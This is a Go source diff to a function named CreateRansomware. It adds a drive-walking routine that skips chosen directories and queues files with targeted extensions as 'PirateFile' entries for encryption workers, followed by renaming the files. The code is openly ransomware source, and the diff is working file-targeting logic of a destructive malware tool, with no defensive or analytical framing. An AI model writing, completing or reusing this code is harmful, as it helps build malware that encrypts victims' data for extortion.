@@ -9,6 +9,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
@@ -126,11 +127,37 @@ func CreateRansomware(serverUrl string, pubKey []byte) {
 		log.Printf("%d - %s\n", response.Status, response.Message)
 	}
 
-	go walkDrives(getDrives())
+	go func() {
+		dirs := getDrives()
+		for _, dir := range dirs {
+			filepath.Walk(dir, walkDriveToEncrypt)
+		}
+		close(fileTracker.Files)
+	}()
 	fileTracker.Add(numWorkers)
 	startEncryption(numWorkers)
 	fileTracker.Wait()
 	renameFiles()
+}
+
+func walkDriveToEncrypt(path string, f os.FileInfo, err error) error {
+	if f.IsDir() {
+		for _, skipDir := range SkippedDirs {
+			if strings.Contains(filepath.Base(path), skipDir) {
+				return filepath.SkipDir
+			}
+		}
+	} else {
+		ext := strings.ToLower(filepath.Ext(path))
+		if len(ext) >= 2 && stringInSlice(ext[1:], InterestingExtensions) {
+			fileTracker.Files <- &PirateFile{
+				FileInfo: f,
+				Extension: ext[1:],
+				FullPath: path,
+			}
+		}
+	}
+	return nil
 }
 
 func startEncryption(numWorkers int) {
